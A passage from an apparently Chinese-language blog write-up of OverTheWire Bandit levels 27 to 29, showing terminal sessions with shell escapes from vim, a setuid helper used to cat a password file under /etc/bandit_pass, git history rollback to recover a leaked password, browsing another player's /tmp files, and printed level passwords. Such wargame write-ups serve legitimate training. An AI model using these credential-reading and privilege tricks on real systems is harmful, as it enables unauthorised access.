class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">bl@bl-virtual-machine:~/wargame$ ssh bandit26@bandit.labs.overthewire.org -p 2220 </span><br><span class="line">This is a OverTheWire game server. More information on http://www.overthewire.org/wargames</span><br><span class="line"></span><br><span class="line">bandit26@bandit.labs.overthewire.org<span class="string">'s password: </span></span><br><span class="line"><span class="string">Linux bandit 4.18.12 x86_64 GNU/Linux</span></span><br><span class="line"><span class="string">               </span></span><br><span class="line"><span class="string">      ,----..            ,----,          .---. </span></span><br><span class="line"><span class="string">     /   /   \         ,/   .`|         /. ./|</span></span><br><span class="line"><span class="string">    /   .     :      ,`   .'</span>  :     .--<span class="string">'.  '</span> ;</span><br><span class="line">   .   /   ;.  \   ;    ;     /    /__./ \ : |</span><br><span class="line">  .   ;   /  ` ; .<span class="string">'___,/    ,'</span> .--<span class="string">'.  '</span>   \<span class="string">' .</span></span><br><span class="line"><span class="string">  ;   |  ; \ ; | |    :     | /___/ \ |    '</span> <span class="string">' </span></span><br><span class="line"><span class="string">  |   :  | ; | '</span> ;    |.<span class="string">';  ; ;   \  \;      : </span></span><br><span class="line"><span class="string">  .   |  '</span> <span class="string">' '</span> : `----<span class="string">'  |  |  \   ;  `      |</span></span><br><span class="line"><span class="string">  '</span>   ;  \; /  |     <span class="string">'   :  ;   .   \    .\  ; </span></span><br><span class="line"><span class="string">   \   \  '</span>,  /      |   |  <span class="string">'    \   \   '</span> \ |</span><br><span class="line">    ;   :    /       <span class="string">'   :  |     :   '</span>  |--<span class="string">"  </span></span><br><span class="line"><span class="string">     \   \ .'        ;   |.'       \   \ ;     </span></span><br><span class="line"><span class="string">  www. `---` ver     '---' he       '---"</span> ire.org     </span><br><span class="line">               </span><br><span class="line">              </span><br><span class="line">Welcome to OverTheWire!</span><br><span class="line"></span><br><span class="line">If you find any problems, please report them to Steven or morla on</span><br><span class="line">irc.overthewire.org.</span><br><span class="line"></span><br><span class="line">--[ Playing the games ]--</span><br><span class="line"></span><br><span class="line">  This machine might hold several wargames. </span><br><span class="line">  If you are playing <span class="string">"somegame"</span>, <span class="keyword">then</span>:</span><br><span class="line"></span><br><span class="line">    * USERNAMES are somegame0, somegame1, ...</span><br><span class="line">    * Most LEVELS are stored <span class="keyword">in</span> /somegame/.</span><br><span class="line">    * PASSWORDS <span class="keyword">for</span> each level are stored <span class="keyword">in</span> /etc/somegame_pass/.</span><br><span class="line"></span><br><span class="line">  Write-access to homedirectories is disabled. It is advised to create a</span><br><span class="line">  working directory with a hard-to-guess name <span class="keyword">in</span> /tmp/.  You can use the</span><br><span class="line">  <span class="built_in">command</span> <span class="string">"mktemp -d"</span> <span class="keyword">in</span> order to generate a random and hard to guess</span><br><span class="line">  directory <span class="keyword">in</span> /tmp/.  Read-access to both /tmp/ and /proc/ is disabled</span><br><span class="line">  so that users can not snoop on eachother. Files and directories with </span><br><span class="line">  easily guessable or short names will be periodically deleted!</span><br><span class="line">4</span><br><span class="line">  Please play nice:</span><br><span class="line">      </span><br><span class="line">    * don<span class="string">'t leave orphan processes running</span></span><br><span class="line"><span class="string">    * don'</span>t leave exploit-files laying around</span><br><span class="line">    * don<span class="string">'t annoy other players</span></span><br><span class="line"><span class="string">    * don'</span>t post passwords or spoilers</span><br><span class="line">    * again, DONT POST SPOILERS! </span><br><span class="line">      This includes writeups of your solution on your blog or website!</span><br><span class="line"></span><br><span class="line">--[ Tips ]--</span><br><span class="line"></span><br><span class="line">  This machine has a 64bit processor and many security-features enabled</span><br><span class="line">  by default, although ASLR has been switched off.  The following</span><br><span class="line">  compiler flags might be interesting:</span><br><span class="line"></span><br><span class="line">    -m32                    compile <span class="keyword">for</span> 32bit</span><br><span class="line">    -fno-stack-protector    <span class="built_in">disable</span> ProPolice</span><br><span class="line">    -Wl,-z,norelro          <span class="built_in">disable</span> relro </span><br><span class="line"></span><br><span class="line">  In addition, the execstack tool can be used to flag the stack as</span><br><span class="line">  executable on ELF binaries.</span><br><span class="line"></span><br><span class="line">  Finally, network-access is limited <span class="keyword">for</span> most levels by a <span class="built_in">local</span></span><br><span class="line">  firewall.</span><br><span class="line"></span><br><span class="line">--[ Tools ]--</span><br><span class="line"></span><br><span class="line"> For your convenience we have installed a few usefull tools <span class="built_in">which</span> you can find</span><br><span class="line"> <span class="keyword">in</span> the following locations:</span><br><span class="line"></span><br><span class="line">    * pwndbg (https://github.com/pwndbg/pwndbg) <span class="keyword">in</span> /usr/<span class="built_in">local</span>/pwndbg/</span><br><span class="line">    * peda (https://github.com/longld/peda.git) <span class="keyword">in</span> /usr/<span class="built_in">local</span>/peda/</span><br><span class="line">    * gdbinit (https://github.com/gdbinit/Gdbinit) <span class="keyword">in</span> /usr/<span class="built_in">local</span>/gdbinit/</span><br><span class="line">    * pwntools (https://github.com/Gallopsled/pwntools)</span><br><span class="line">    * radare2 (http://www.radare.org/)</span><br><span class="line">    * checksec.sh (http://www.trapkit.de/tools/checksec.html) <span class="keyword">in</span> /usr/<span class="built_in">local</span>/bin/checksec.sh</span><br><span class="line"></span><br><span class="line">--[ More information ]--</span><br><span class="line"></span><br><span class="line">  For more information regarding individual wargames, visit</span><br><span class="line">  http://www.overthewire.org/wargames/</span><br><span class="line"></span><br><span class="line">  For support, questions or comments, contact us through IRC on</span><br><span class="line">  irc.overthewire.org <span class="comment">#wargames.</span></span><br><span class="line"></span><br><span class="line">  Enjoy your stay!</span><br><span class="line"></span><br><span class="line">  _                     _ _ _   ___   __  </span><br><span class="line"> | |                   | (_) | |__ \ / /  </span><br><span class="line">!vim</span><br><span class="line">  _                     _ _ _   ___   __  </span><br><span class="line"> | |                   | (_) | |__ \ / /  </span><br><span class="line">!v</span><br><span class="line">  _                     _ _ _   ___   __</span><br><span class="line"> | |                   | (_) | |__ \ / /</span><br><span class="line">:!ls</span><br><span class="line">  _                     _ _ _   ___   __  </span><br><span class="line"> | |                   | (_) | |__ \ / /</span><br><span class="line"> | |__   __ _ _ __   __| |_| |_   ) / /_</span><br><span class="line">:!ls</span><br><span class="line">  _                     _ _ _   ___   __  </span><br><span class="line"> | |                   | (_) | |__ \ / /</span><br><span class="line">:sh</span><br><span class="line">$ ls</span><br><span class="line">bandit27-do  text.txt</span><br><span class="line">$ cat text.txt</span><br><span class="line">  _                     _ _ _   ___   __  </span><br><span class="line"> | |                   | (_) | |__ \ / /  </span><br><span class="line"> | |__   __ _ _ __   __| |_| |_   ) / /_  </span><br><span class="line"> | <span class="string">'_ \ / _` | '</span>_ \ / _` | | __| / / <span class="string">'_ \ </span></span><br><span class="line"><span class="string"> | |_) | (_| | | | | (_| | | |_ / /| (_) |</span></span><br><span class="line"><span class="string"> |_.__/ \__,_|_| |_|\__,_|_|\__|____\___/ </span></span><br><span class="line"><span class="string">$ ./bandit27-do</span></span><br><span class="line"><span class="string">Run a command as another user.</span></span><br><span class="line"><span class="string">  Example: ./bandit27-do id</span></span><br><span class="line"><span class="string">$ ./bandit27-do id</span></span><br><span class="line"><span class="string">uid=11026(bandit26) gid=11026(bandit26) euid=11027(bandit27) groups=11026(bandit26)</span></span><br><span class="line"><span class="string">$ ./bandit27-do cat /etc/bandit_pass/bandit27</span></span><br><span class="line"><span class="string">3ba3118a22e93127a4ed485be72ef5ea</span></span><br></pre></td></tr></table></figure><h3 id="level-28"><a href="#level-28" class="headerlink" title="level 28"></a>level 28</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line">bl@bl-virtual-machine:~/wargame$ ssh bandit27@bandit.labs.overthewire.org -p 2220 </span><br><span class="line">This is a OverTheWire game server. More information on http://www.overthewire.org/wargames</span><br><span class="line"></span><br><span class="line">bandit27@bandit.labs.overthewire.org<span class="string">'s password: </span></span><br><span class="line"><span class="string">Linux bandit 4.18.12 x86_64 GNU/Linux</span></span><br><span class="line"><span class="string">               </span></span><br><span class="line"><span class="string">      ,----..            ,----,          .---. </span></span><br><span class="line"><span class="string">     /   /   \         ,/   .`|         /. ./|</span></span><br><span class="line"><span class="string">    /   .     :      ,`   .'</span>  :     .--<span class="string">'.  '</span> ;</span><br><span class="line">   .   /   ;.  \   ;    ;     /    /__./ \ : |</span><br><span class="line">  .   ;   /  ` ; .<span class="string">'___,/    ,'</span> .--<span class="string">'.  '</span>   \<span class="string">' .</span></span><br><span class="line"><span class="string">  ;   |  ; \ ; | |    :     | /___/ \ |    '</span> <span class="string">' </span></span><br><span class="line"><span class="string">  |   :  | ; | '</span> ;    |.<span class="string">';  ; ;   \  \;      : </span></span><br><span class="line"><span class="string">  .   |  '</span> <span class="string">' '</span> : `----<span class="string">'  |  |  \   ;  `      |</span></span><br><span class="line"><span class="string">  '</span>   ;  \; /  |     <span class="string">'   :  ;   .   \    .\  ; </span></span><br><span class="line"><span class="string">   \   \  '</span>,  /      |   |  <span class="string">'    \   \   '</span> \ |</span><br><span class="line">    ;   :    /       <span class="string">'   :  |     :   '</span>  |--<span class="string">"  </span></span><br><span class="line"><span class="string">     \   \ .'        ;   |.'       \   \ ;     </span></span><br><span class="line"><span class="string">  www. `---` ver     '---' he       '---"</span> ire.org     </span><br><span class="line">               </span><br><span class="line">              </span><br><span class="line">Welcome to OverTheWire!</span><br><span class="line"></span><br><span class="line">If you find any problems, please report them to Steven or morla on</span><br><span class="line">irc.overthewire.org.</span><br><span class="line"></span><br><span class="line">--[ Playing the games ]--</span><br><span class="line"></span><br><span class="line">  This machine might hold several wargames. </span><br><span class="line">  If you are playing <span class="string">"somegame"</span>, <span class="keyword">then</span>:</span><br><span class="line"></span><br><span class="line">    * USERNAMES are somegame0, somegame1, ...</span><br><span class="line">    * Most LEVELS are stored <span class="keyword">in</span> /somegame/.</span><br><span class="line">    * PASSWORDS <span class="keyword">for</span> each level are stored <span class="keyword">in</span> /etc/somegame_pass/.</span><br><span class="line"></span><br><span class="line">  Write-access to homedirectories is disabled. It is advised to create a</span><br><span class="line">  working directory with a hard-to-guess name <span class="keyword">in</span> /tmp/.  You can use the</span><br><span class="line">  <span class="built_in">command</span> <span class="string">"mktemp -d"</span> <span class="keyword">in</span> order to generate a random and hard to guess</span><br><span class="line">  directory <span class="keyword">in</span> /tmp/.  Read-access to both /tmp/ and /proc/ is disabled</span><br><span class="line">  so that users can not snoop on eachother. Files and directories with </span><br><span class="line">  easily guessable or short names will be periodically deleted!</span><br><span class="line">4</span><br><span class="line">  Please play nice:</span><br><span class="line">      </span><br><span class="line">    * don<span class="string">'t leave orphan processes running</span></span><br><span class="line"><span class="string">    * don'</span>t leave exploit-files laying around</span><br><span class="line">    * don<span class="string">'t annoy other players</span></span><br><span class="line"><span class="string">    * don'</span>t post passwords or spoilers</span><br><span class="line">    * again, DONT POST SPOILERS! </span><br><span class="line">      This includes writeups of your solution on your blog or website!</span><br><span class="line"></span><br><span class="line">--[ Tips ]--</span><br><span class="line"></span><br><span class="line">  This machine has a 64bit processor and many security-features enabled</span><br><span class="line">  by default, although ASLR has been switched off.  The following</span><br><span class="line">  compiler flags might be interesting:</span><br><span class="line"></span><br><span class="line">    -m32                    compile <span class="keyword">for</span> 32bit</span><br><span class="line">    -fno-stack-protector    <span class="built_in">disable</span> ProPolice</span><br><span class="line">    -Wl,-z,norelro          <span class="built_in">disable</span> relro </span><br><span class="line"></span><br><span class="line">  In addition, the execstack tool can be used to flag the stack as</span><br><span class="line">  executable on ELF binaries.</span><br><span class="line"></span><br><span class="line">  Finally, network-access is limited <span class="keyword">for</span> most levels by a <span class="built_in">local</span></span><br><span class="line">  firewall.</span><br><span class="line"></span><br><span class="line">--[ Tools ]--</span><br><span class="line"></span><br><span class="line"> For your convenience we have installed a few usefull tools <span class="built_in">which</span> you can find</span><br><span class="line"> <span class="keyword">in</span> the following locations:</span><br><span class="line"></span><br><span class="line">    * pwndbg (https://github.com/pwndbg/pwndbg) <span class="keyword">in</span> /usr/<span class="built_in">local</span>/pwndbg/</span><br><span class="line">    * peda (https://github.com/longld/peda.git) <span class="keyword">in</span> /usr/<span class="built_in">local</span>/peda/</span><br><span class="line">    * gdbinit (https://github.com/gdbinit/Gdbinit) <span class="keyword">in</span> /usr/<span class="built_in">local</span>/gdbinit/</span><br><span class="line">    * pwntools (https://github.com/Gallopsled/pwntools)</span><br><span class="line">    * radare2 (http://www.radare.org/)</span><br><span class="line">    * checksec.sh (http://www.trapkit.de/tools/checksec.html) <span class="keyword">in</span> /usr/<span class="built_in">local</span>/bin/checksec.sh</span><br><span class="line"></span><br><span class="line">--[ More information ]--</span><br><span class="line"></span><br><span class="line">  For more information regarding individual wargames, visit</span><br><span class="line">  http://www.overthewire.org/wargames/</span><br><span class="line"></span><br><span class="line">  For support, questions or comments, contact us through IRC on</span><br><span class="line">  irc.overthewire.org <span class="comment">#wargames.</span></span><br><span class="line"></span><br><span class="line">  Enjoy your stay!</span><br><span class="line"></span><br><span class="line">bandit27@bandit:~$ git <span class="built_in">clone</span> ssh://bandit27-git@localhost/home/bandit27-git/repofatal: could not create work tree dir <span class="string">'repo'</span>: Permission denied</span><br><span class="line">bandit27@bandit:~$ git <span class="built_in">clone</span> ssh://bandit27-git@localhost:2220/home/bandit27-git/repo</span><br><span class="line">fatal: could not create work tree dir <span class="string">'repo'</span>: Permission denied</span><br><span class="line">bandit27@bandit:~$ <span class="built_in">cd</span> /tmp</span><br><span class="line">bandit27@bandit:/tmp$ mkdir b27r</span><br><span class="line">bandit27@bandit:/tmp$ <span class="built_in">cd</span> b27r</span><br><span class="line">bandit27@bandit:/tmp/b27r$ git <span class="built_in">clone</span> ssh://bandit27-git@localhost:2220/home/bandit27-git/repo</span><br><span class="line">Cloning into <span class="string">'repo'</span>...</span><br><span class="line">ssh: connect to host localhost port 2220: Connection refused</span><br><span class="line">fatal: Could not <span class="built_in">read</span> from remote repository.</span><br><span class="line"></span><br><span class="line">Please make sure you have the correct access rights</span><br><span class="line">and the repository exists.</span><br><span class="line">bandit27@bandit:/tmp/b27r$ git <span class="built_in">clone</span> ssh://bandit27-git@localhost/home/bandit27-git/repo</span><br><span class="line">Cloning into <span class="string">'repo'</span>...</span><br><span class="line">Could not create directory <span class="string">'/home/bandit27/.ssh'</span>.</span><br><span class="line">The authenticity of host <span class="string">'localhost (127.0.0.1)'</span> can<span class="string">'t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no)? yes</span></span><br><span class="line"><span class="string">Failed to add the host to the list of known hosts (/home/bandit27/.ssh/known_hosts).</span></span><br><span class="line"><span class="string">This is a OverTheWire game server. More information on http://www.overthewire.org/wargames</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">bandit27-git@localhost'</span>s password: </span><br><span class="line">remote: Counting objects: 3, <span class="keyword">done</span>.</span><br><span class="line">remote: Compressing objects: 100% (2/2), <span class="keyword">done</span>.</span><br><span class="line">remote: Total 3 (delta 0), reused 0 (delta 0)</span><br><span class="line">Receiving objects: 100% (3/3), <span class="keyword">done</span>.</span><br><span class="line">bandit27@bandit:/tmp/b27r$ ls</span><br><span class="line">repo</span><br><span class="line">bandit27@bandit:/tmp/b27r$ <span class="built_in">cd</span> repo</span><br><span class="line">bandit27@bandit:/tmp/b27r/repo$ ls</span><br><span class="line">README</span><br><span class="line">bandit27@bandit:/tmp/b27r/repo$ </span><br><span class="line">bandit27@bandit:/tmp/b27r/repo$ cat README</span><br><span class="line">The password to the next level is: 0ef186ac70e04ea33b4c1853d2526fa2</span><br><span class="line">bandit27@bandit:/tmp/b27r/repo$</span><br></pre></td></tr></table></figure><p>由题目知道git的密码和本关flag一样</p><p>很简单的一个git的用法，git支持ssh协议这在之前就已经知道了</p><p>所以直接进入bandit27去clone仓库</p><p>结果没有权限，以为是端口错了，结果是忘了我们对bandit27的home目录没有读写权限</p><p>老办法，去tmp创一个新目录，然后clone，果然成功，flag在repo里的README里</p><h3 id="level-29"><a href="#level-29" class="headerlink" title="level 29"></a>level 29</h3><p>无意的发现</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">bandit12@bandit:~$ ls</span><br><span class="line">data.txt</span><br><span class="line">bandit12@bandit:~$ ls /tmp/fuck</span><br><span class="line">repo</span><br><span class="line">bandit12@bandit:~$ ls /tmp/fuck/repo</span><br><span class="line">README.md</span><br><span class="line">bandit12@bandit:~$ ls /tmp/fuck/repo/README.md </span><br><span class="line">/tmp/fuck/repo/README.md</span><br><span class="line">bandit12@bandit:~$ cat /tmp/fuck/repo/README.md </span><br><span class="line"><span class="comment"># Bandit Notes</span></span><br><span class="line">Some notes <span class="keyword">for</span> level29 of bandit.</span><br><span class="line"></span><br><span class="line"><span class="comment">## credentials</span></span><br><span class="line"></span><br><span class="line">- username: bandit29</span><br><span class="line">- password: bbc96594b4e001778eee9975372716b2</span><br></pre></td></tr></table></figure><p>原来是碰巧有人在<code>/tmp/fuck</code>创建了这个git仓库，同道中人啊</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line">bl@bl-virtual-machine:~/wargame$ ssh bandit28@bandit.labs.overthewire.org -p 2220 </span><br><span class="line">This is a OverTheWire game server. More information on http://www.overthewire.org/wargames</span><br><span class="line"></span><br><span class="line">bandit28@bandit.labs.overthewire.org<span class="string">'s password: </span></span><br><span class="line"><span class="string">Linux bandit 4.18.12 x86_64 GNU/Linux</span></span><br><span class="line"><span class="string">               </span></span><br><span class="line"><span class="string">      ,----..            ,----,          .---. </span></span><br><span class="line"><span class="string">     /   /   \         ,/   .`|         /. ./|</span></span><br><span class="line"><span class="string">    /   .     :      ,`   .'</span>  :     .--<span class="string">'.  '</span> ;</span><br><span class="line">   .   /   ;.  \   ;    ;     /    /__./ \ : |</span><br><span class="line">  .   ;   /  ` ; .<span class="string">'___,/    ,'</span> .--<span class="string">'.  '</span>   \<span class="string">' .</span></span><br><span class="line"><span class="string">  ;   |  ; \ ; | |    :     | /___/ \ |    '</span> <span class="string">' </span></span><br><span class="line"><span class="string">  |   :  | ; | '</span> ;    |.<span class="string">';  ; ;   \  \;      : </span></span><br><span class="line"><span class="string">  .   |  '</span> <span class="string">' '</span> : `----<span class="string">'  |  |  \   ;  `      |</span></span><br><span class="line"><span class="string">  '</span>   ;  \; /  |     <span class="string">'   :  ;   .   \    .\  ; </span></span><br><span class="line"><span class="string">   \   \  '</span>,  /      |   |  <span class="string">'    \   \   '</span> \ |</span><br><span class="line">    ;   :    /       <span class="string">'   :  |     :   '</span>  |--<span class="string">"  </span></span><br><span class="line"><span class="string">     \   \ .'        ;   |.'       \   \ ;     </span></span><br><span class="line"><span class="string">  www. `---` ver     '---' he       '---"</span> ire.org     </span><br><span class="line">               </span><br><span class="line">              </span><br><span class="line">Welcome to OverTheWire!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  Enjoy your stay!</span><br><span class="line"></span><br><span class="line">bandit28@bandit:~$ ls</span><br><span class="line">bandit28@bandit:~$ mkdir /tmp/b28r</span><br><span class="line">bandit28@bandit:~$ <span class="built_in">cd</span> /tmp/b28r</span><br><span class="line">bandit28@bandit:/tmp/b28r$ ls</span><br><span class="line">bandit28@bandit:/tmp/b28r$ git <span class="built_in">clone</span> ssh://bandit28-git@localhost/home/bandit28-git/repo</span><br><span class="line">Cloning into <span class="string">'repo'</span>...</span><br><span class="line">Could not create directory <span class="string">'/home/bandit28/.ssh'</span>.</span><br><span class="line">The authenticity of host <span class="string">'localhost (127.0.0.1)'</span> can<span class="string">'t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no)? yes</span></span><br><span class="line"><span class="string">Failed to add the host to the list of known hosts (/home/bandit28/.ssh/known_hosts).</span></span><br><span class="line"><span class="string">This is a OverTheWire game server. More information on http://www.overthewire.org/wargames</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">bandit28-git@localhost'</span>s password: </span><br><span class="line">remote: Counting objects: 9, <span class="keyword">done</span>.</span><br><span class="line">remote: Compressing objects: 100% (6/6), <span class="keyword">done</span>.</span><br><span class="line">remote: Total 9 (delta 2), reused 0 (delta 0)</span><br><span class="line">Receiving objects: 100% (9/9), <span class="keyword">done</span>.</span><br><span class="line">Resolving deltas: 100% (2/2), <span class="keyword">done</span>.</span><br><span class="line">bandit28@bandit:/tmp/b28r$ ls</span><br><span class="line">repo</span><br><span class="line">bandit28@bandit:/tmp/b28r$ <span class="built_in">cd</span> repo</span><br><span class="line">bandit28@bandit:/tmp/b28r/repo$ ls</span><br><span class="line">README.md</span><br><span class="line">bandit28@bandit:/tmp/b28r/repo$ cat README.md </span><br><span class="line"><span class="comment"># Bandit Notes</span></span><br><span class="line">Some notes <span class="keyword">for</span> level29 of bandit.</span><br><span class="line"></span><br><span class="line"><span class="comment">## credentials</span></span><br><span class="line"></span><br><span class="line">- username: bandit29</span><br><span class="line">- password: xxxxxxxxxx</span><br><span class="line"></span><br><span class="line">bandit28@bandit:/tmp/b28r/repo$ ls -al</span><br><span class="line">total 16</span><br><span class="line">drwxr-sr-x 3 bandit28 root 4096 Feb 26 04:12 .</span><br><span class="line">drwxr-sr-x 3 bandit28 root 4096 Feb 26 04:12 ..</span><br><span class="line">drwxr-sr-x 8 bandit28 root 4096 Feb 26 04:12 .git</span><br><span class="line">-rw-r--r-- 1 bandit28 root  111 Feb 26 04:12 README.md</span><br><span class="line">bandit28@bandit:/tmp/b28r/repo$ ls .git</span><br><span class="line">branches  description  hooks  info  objects      refs</span><br><span class="line">config    HEAD         index  logs  packed-refs</span><br><span class="line">bandit28@bandit:/tmp/b28r/repo$ ls .git/branches/</span><br><span class="line">bandit28@bandit:/tmp/b28r/repo$ cat .git/HEAD</span><br><span class="line">ref: refs/heads/master</span><br><span class="line">bandit28@bandit:/tmp/b28r/repo$ git <span class="built_in">log</span></span><br><span class="line">commit 073c27c130e6ee407e12faad1dd3848a110c4f95</span><br><span class="line">Author: Morla Porla &lt;morla@overthewire.org&gt;</span><br><span class="line">Date:   Tue Oct 16 14:00:39 2018 +0200</span><br><span class="line"></span><br><span class="line">    fix info leak</span><br><span class="line"></span><br><span class="line">commit 186a1038cc54d1358d42d468cdc8e3cc28a93fcb</span><br><span class="line">Author: Morla Porla &lt;morla@overthewire.org&gt;</span><br><span class="line">Date:   Tue Oct 16 14:00:39 2018 +0200</span><br><span class="line"></span><br><span class="line">    add missing data</span><br><span class="line"></span><br><span class="line">commit b67405defc6ef44210c53345fc953e6a21338cc7</span><br><span class="line">Author: Ben Dover &lt;noone@overthewire.org&gt;</span><br><span class="line">Date:   Tue Oct 16 14:00:39 2018 +0200</span><br><span class="line"></span><br><span class="line">    initial commit of README.md</span><br><span class="line">bandit28@bandit:/tmp/b28r/repo$ git revert 186a1038cc54d1358d42d468cdc8e3cc28a93fcb</span><br><span class="line">error: could not revert 186a103... add missing data</span><br><span class="line">hint: after resolving the conflicts, mark the corrected paths</span><br><span class="line">hint: with <span class="string">'git add &lt;paths&gt;'</span> or <span class="string">'git rm &lt;paths&gt;'</span></span><br><span class="line">hint: and commit the result with <span class="string">'git commit'</span></span><br><span class="line">bandit28@bandit:/tmp/b28r/repo$ git reset --hard  186a1038cc54d1358d42d468cdc8e3cc28a93fcb</span><br><span class="line">HEAD is now at 186a103 add missing data</span><br><span class="line">bandit28@bandit:/tmp/b28r/repo$ ls</span><br><span class="line">README.md</span><br><span class="line">bandit28@bandit:/tmp/b28r/repo$ cat README.md </span><br><span class="line"><span class="comment"># Bandit Notes</span></span><br><span class="line">Some notes <span class="keyword">for</span> level29 of bandit.</span><br><span class="line"></span><br><span class="line"><span class="comment">## credentials</span></span><br><span class="line"></span><br><span class="line">- username: 